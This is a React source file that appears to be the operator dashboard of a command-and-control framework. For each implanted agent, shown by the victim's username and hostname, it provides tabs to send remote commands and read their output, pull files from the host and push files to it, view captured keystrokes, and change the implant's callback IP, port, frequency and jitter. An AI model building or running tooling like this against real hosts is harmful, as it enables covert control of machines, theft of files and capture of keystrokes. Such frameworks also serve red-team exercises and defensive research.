import React, { useEffect, useState, useContext, useRef } from 'react';
import axios from '../../api/axios';
import AuthContext from '../../context/AuthProvider';
import { useLocation } from 'react-router-dom';
import './Agent.css';

const Agent = () => {
  const { auth } = useContext(AuthContext);
  const [error, setError] = useState(null);

  const [data, setData] = useState(null);
  const [activeTab, setActiveTab] = useState('commands');
  
  // States related to commands tab
  const [commands, setCommands] = useState([]);
  const [keylogs, setKeylogs] = useState([]);
  const [newCommand, setNewCommand] = useState('');
  const commandListRef = useRef(null);
  const [isAtBottom, setIsAtBottom] = useState(true);
  const prevCommandsLengthRef = useRef(0);
  const prevCommandsRef = useRef([]);

  // States related to Configuration tab
  const [callbackIP, setCallbackIP] = useState('');
  const [callbackPort, setCallbackPort] = useState('');
  const [callbackFreq, setCallbackFreq] = useState('');
  const [callbackJitter, setCallbackJitter] = useState('');
  const [saveError, setSaveError] = useState(null);
  const [isSaving, setIsSaving] = useState(false);

  // States related to Notes tab
  const [notes, setNotes] = useState('');
  const [notesError, setNotesError] = useState(null);
  const [isSavingNotes, setIsSavingNotes] = useState(false);

  const location = useLocation();
  const lockedTabs = ['configuration', 'notes'];

  // States related to Tags tab
  const [tags, setTags] = useState([]);
  const [newKey, setNewKey] = useState('');
  const [newValue, setNewValue] = useState('');

  // States related to Files tab
  const [files, setFiles] = useState([]);
  const [fileUploadPath, setFileUploadPath] = useState('');
  const [fileToUpload, setFileToUpload] = useState(null);
  const [uploadError, setUploadError] = useState(null);
  const fileInputRef = useRef(null);
  

  const getQueryParam = (param) => {
    const searchParams = new URLSearchParams(location.search);
    return searchParams.get(param);
  };

  const fetchData = async () => {
    if (lockedTabs.includes(activeTab)) {
      return;
    }

    try {
      const queryParam = getQueryParam('agt');
      const agentResponse = await axios.get(`/api/agent/${queryParam}`);
      const commandsResponse = await axios.get(`/api/commands/${queryParam}`);
      const filesResponse = await axios.get(`/api/files/list/${queryParam}`);
      const keylogsResponse = await axios.get(`/api/keylog/${queryParam}`);
      const notesResponse = await axios.get(`/api/notes/${queryParam}`);
      const tagsResponse = await axios.get(`/api/tags/${queryParam}`);
      const tagsData = tagsResponse.data.tags;
      const responseData = agentResponse.data.data;

      if (responseData) {
        setData(responseData);
        setCallbackIP(responseData.serverip || '');
        setCallbackPort(responseData.serverport || '');
        setCallbackFreq(responseData.callbackfrequency || '');
        setCallbackJitter(responseData.callbackjitter || '');
      } else {
        setError('No data found');
      }

      if (commandsResponse.data.data) {
        const newCommands = commandsResponse.data.data;
  
        let commandsChanged = false;
  
        if (newCommands.length !== prevCommandsRef.current.length) {
          commandsChanged = true;
        } else {
          for (let i = 0; i < newCommands.length; i++) {
            if (
              newCommands[i].commanduuid !== prevCommandsRef.current[i].commanduuid ||
              newCommands[i].output !== prevCommandsRef.current[i].output
            ) {
              commandsChanged = true;
              break;
            }
          }
        }
  
        if (commandsChanged) {
          setCommands(newCommands);
          prevCommandsRef.current = newCommands;
        }
      } else {
        if (commands.length !== 0) {
          setCommands([]);
          prevCommandsRef.current = [];
        }
      }
      if (filesResponse.data.data){
        setFiles(filesResponse.data.data)
      } else {
        setFiles([])
      }
      if (keylogsResponse.data.data) {
        setKeylogs(keylogsResponse.data.data);
      } else {
        setKeylogs([]);
      }
      if (notesResponse.data.data && notesResponse.data.data.length > 0) {
        setNotes(notesResponse.data.data[0].note || '');
      } else {
        setNotes('');
      }
      if (Array.isArray(tagsData)) {
        setTags(tagsData);
      } else {
        setTags([]);
      }
    } catch (err) {
      setError(err.message);
    }
  };
  
  const handleDownloadFile = async (fileId) => {
    try {
      const response = await axios.get(`/api/files/download/${fileId}`, {
        responseType: 'blob',
      });
  
      const contentDisposition = response.headers['content-disposition'];
      let filename = 'file';
  
      if (contentDisposition && contentDisposition.indexOf('attachment') !== -1) {
        const filenameMatch = contentDisposition.match(/filename=["']?([^"']+)["']?/);
        if (filenameMatch && filenameMatch[1]) {
          filename = filenameMatch[1];
        }
      }
  
      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', filename);
      document.body.appendChild(link);
      link.click();
    } catch (err) {
      console.error('Failed to download file:', err);
    }
  };
  
  const handleFileTransferRequest = async () => {
    try {
      const formData = new FormData();
      
      const transfertype = fileToUpload ? 'Download' : 'Upload';
      
      if (fileToUpload) {
        formData.append('file', fileToUpload);
      }
      
      formData.append('path', fileUploadPath);
      formData.append('uuid', getQueryParam('agt'));
      formData.append('transfertype', transfertype);
  
      await axios.post('/api/files/upload', formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });
  
      if (fileInputRef.current) {
        fileInputRef.current.value = ''; 
      }
  
    } catch (err) {
      setUploadError('Failed to upload file');
    }
    setFileUploadPath('');
    setFileToUpload(null);
  };
  

  useEffect(() => {
    fetchData();
    const interval = setInterval(() => {
      fetchData();
    }, 5000);

    return () => clearInterval(interval);
  }, [location.search, activeTab]);

  useEffect(() => {
    const handleScroll = () => {
      if (!commandListRef.current) return;
  
      const { scrollTop, scrollHeight, clientHeight } = commandListRef.current;
      const isScrolledToBottom = scrollHeight - scrollTop - clientHeight <= 1;
  
      setIsAtBottom(isScrolledToBottom);
    };
  
    const commandListElement = commandListRef.current;
    if (commandListElement) {
      commandListElement.addEventListener('scroll', handleScroll);
    }
  
    return () => {
      if (commandListElement) {
        commandListElement.removeEventListener('scroll', handleScroll);
      }
    };
  }, []);   
  
  useEffect(() => {
    if (!commandListRef.current) return;
  
    if (isAtBottom) {
      commandListRef.current.scrollTop = commandListRef.current.scrollHeight;
    }
  }, [commands, isAtBottom]);  

  const handleSendCommand = async () => {
    try {
      const queryParam = getQueryParam('agt');
      if (newCommand.trim() === '') {
        setError('Command cannot be empty');
        return;
      }

      const commandBody = { command: newCommand };
      await axios.post(`/api/command/${queryParam}`, commandBody);
      setNewCommand('');
      fetchData();
    } catch (err) {
      setError('Failed to send command');
    }
  };

  const handleSaveConfiguration = async () => {
    try {
      setIsSaving(true);
      setSaveError(null);

      const queryParam = getQueryParam('agt');
      const updateBody = {
        serverip : callbackIP,
        serverport: callbackPort,
        callbackfreq: callbackFreq,
        callbackjitter: callbackJitter,
      };

      await axios.post(`/api/updateagent/${queryParam}`, updateBody, {
        headers: {
          Authorization: `Bearer ${auth.token}`,
        },
      });

      setIsSaving(false);
      fetchData();
    } catch (err) {
      setSaveError('Failed to save configuration');
      setIsSaving(false);
    }
  };

  if (error) {
    return <div>Error: {error}</div>;
  }

  if (!data) {
    return <p>No data available</p>;
  }

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleSendCommand();
    }
  };
  
  const renderCommandsTab = () => (
    <div className="commands-list" ref={commandListRef}>
      {commands.length === 0 ? (
        <p>No commands available.</p>
      ) : (
        <ul>
          {commands.map((cmd) => (
            <li key={cmd.commanduuid}>
              <div>
                <strong>Command:</strong> {cmd.command}
              </div>
              <div>
                <strong>Output:</strong>
                <pre>{cmd.output !== '' ? cmd.output : 'Success (No output)'}</pre>
              </div>
            </li>
          ))}
        </ul>
      )}
      <div className="command-input">
        <input
          type="text"
          placeholder="Enter command"
          value={newCommand}
          onChange={(e) => setNewCommand(e.target.value)}
          onKeyDown={handleKeyPress}
        />
        <button onClick={handleSendCommand}>Send</button>
      </div>
    </div>
  );
  
  const renderFilesTab = () => {
    return (
      <div>
        <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
          <table>
            <thead>
              <tr>
                <th>File Path</th>
                <th>Status</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {files.map((file) => (
                <tr key={file.FileID}>
                  <td>{file.Path}</td>
                  <td>{file.Status}</td>
                  <td>
                    <button onClick={() => handleDownloadFile(file.FileID)}>
                      Download
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <h3>File Transfers</h3>
        <form onSubmit={(e) => { e.preventDefault(); handleFileTransferRequest(); }}>
          <div>
            <label>Path: </label>
            <input
              type="text"
              value={fileUploadPath}
              onChange={(e) => setFileUploadPath(e.target.value)}
              required
            />
          </div>
          <div>
            <label>File: </label>
            <input
              type="file"
              onChange={(e) => setFileToUpload(e.target.files[0])}
              ref={fileInputRef}
            />
          </div>
          <button type="submit">Request Transfer</button>
        </form>
        {uploadError && <p className="error">{uploadError}</p>}
      </div>
    );
  };

  const handleSaveNotes = async () => {
    try {
      setIsSavingNotes(true);
      setNotesError(null);

      const queryParam = getQueryParam('agt');
      const notesBody = { notes: notes };
      await axios.put(`/api/notes/${queryParam}`, notesBody);

      setIsSavingNotes(false);
    } catch (err) {
      setNotesError('Failed to save notes');
      setIsSavingNotes(false);
    }
  };

  const renderNotesTab = () => (
    <div className="notes-tab">
      <textarea
        value={notes}
        onChange={(e) => setNotes(e.target.value)}
        placeholder="Enter your notes here"
        rows={10}
        cols={50}
        disabled={isSavingNotes}
      />
      <button onClick={handleSaveNotes} disabled={isSavingNotes}>
        {isSavingNotes ? 'Saving...' : 'Save Notes'}
      </button>
      {notesError && <p className="error">{notesError}</p>}
    </div>
  );

  const renderKeylogsTab = () => (
    <div className="keylogs-list">
      {keylogs.length === 0 ? (
        <p>No keylogs available.</p>
      ) : (
        <ul>
          {keylogs.map((keylog) => (
            <li key={keylog.uuid}>
              {keylog.keys || 'No keys recorded'}
            </li>
          ))}
        </ul>
      )}
    </div>
  );

  const renderConfigurationTab = () => (
    <div className="configuration-tab">
        <h3>Agent Configuration</h3>
        <form>
            <div className="form-group">
                <label htmlFor="callbackIP">Callback IP</label>
                <input
                    type="text"
                    id="callbackIP"
                    value={callbackIP}
                    onChange={(e) => setCallbackIP(e.target.value)}
                    disabled={isSaving}
                />
            </div>
            <div className="form-group">
                <label htmlFor="callbackPort">Callback Port</label>
                <input
                    type="text"
                    id="callbackPort"
                    value={callbackPort}
                    onChange={(e) => setCallbackPort(e.target.value)}
                    disabled={isSaving}
                />
            </div>
            <div className="form-group">
                <label htmlFor="callbackFreq">Callback Frequency (seconds)</label>
                <input
                    type="number"
                    id="callbackFreq"
                    value={callbackFreq}
                    onChange={(e) => setCallbackFreq(e.target.value)}
                    disabled={isSaving}
                />
            </div>
            <div className="form-group">
                <label htmlFor="callbackJitter">Callback Jitter (%)</label>
                <input
                    type="number"
                    id="callbackJitter"
                    value={callbackJitter}
                    onChange={(e) => setCallbackJitter(e.target.value)}
                    disabled={isSaving}
                />
            </div>
            <button type="button" onClick={handleSaveConfiguration} disabled={isSaving}>
                {isSaving ? 'Saving...' : 'Save'}
            </button>
        </form>
        {saveError && <p className="error">{saveError}</p>}
    </div>
  );

  const handleAddTag = async (e) => {
    e.preventDefault();
    const queryParam = getQueryParam('agt');
    try {
      const newTag = {
        agents: [queryParam],
        key: newKey,
        value: newValue
      };

      const response = await axios.put('/api/tag', newTag);
      setTags([...tags, { tagid: response.data.tagid, key: newKey, value: newValue }]);
      setNewKey('');
      setNewValue('');
    } catch (error) {
      console.error("Error adding new tag:", error);
    }
  };

  const handleDeleteTag = async (tagId) => {
    try {
      const response = await axios.delete(`/api/tag/${tagId}`);
  
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      setTags(tags.filter(tag => tag.tagid !== tagId));
    } catch (error) {
      console.error('Error deleting tag:', error);
    }
  };
  

  const renderTagsTab = () => {
    return (
      <div>
        <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
          <table>
            <thead>
              <tr>
                <th>Key</th>
                <th>Value</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {tags.map(tag => (
                <tr key={tag.tagid}>
                  <td>{tag.key}</td>
                  <td>{tag.value || 'N/A'}</td>
                  <td>
                    <button onClick={() => handleDeleteTag(tag.tagid)}>Delete</button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        <h3>Add / Modify Tags</h3>
        <form onSubmit={handleAddTag}>
          <div>
            <label>Key: </label>
            <input
              type="text"
              value={newKey}
              onChange={(e) => setNewKey(e.target.value)}
              required
            />
          </div>
          <div>
            <label>Value: </label>
            <input
              type="text"
              value={newValue}
              onChange={(e) => setNewValue(e.target.value)}
            />
          </div>
          <button type="submit">Add Tag</button>
        </form>
      </div>
    );
  };
  
  return (
    <div className="agent-container">
        <div className="agent-header">
            <div className="agent-identity">
                {data.username?.trim()}@{data.hostname?.trim()}
            </div>
            <div className="agent-status">
                Status: {data.status}
            </div>
        </div>
        <div className="agent-tabs">
            <div className="tabs">
                <button
                    className={activeTab === 'commands' ? 'active' : ''}
                    onClick={() => setActiveTab('commands')}
                >
                    Commands
                </button>
                <button
                    className={activeTab === 'files' ? 'active' : ''}
                    onClick={() => setActiveTab('files')}
                >
                    Files
                </button>
                <button
                    className={activeTab === 'keys' ? 'active' : ''}
                    onClick={() => setActiveTab('keys')}
                >
                    Keylogs
                </button>
                <button
                    className={activeTab === 'configuration' ? 'active' : ''}
                    onClick={() => setActiveTab('configuration')}
                >
                    Configuration
                </button>
                <button
                    className={activeTab === 'notes' ? 'active' : ''}
                    onClick={() => setActiveTab('notes')}
                >
                    Notes
                </button>
                <button
                    className={activeTab === 'tags' ? 'active' : ''}
                    onClick={() => setActiveTab('tags')}
                >
                    Tags
                </button>
            </div>
  
            <div className="tab-content">
                {activeTab === 'commands' && renderCommandsTab()}
                {activeTab === 'files' && renderFilesTab()}
                {activeTab === 'keys' && renderKeylogsTab()}
                {activeTab === 'configuration' && renderConfigurationTab()}
                {activeTab === 'notes' && renderNotesTab()}
                {activeTab === 'tags' && renderTagsTab()}
            </div>
        </div>
    </div>
  );  
};

export default Agent;
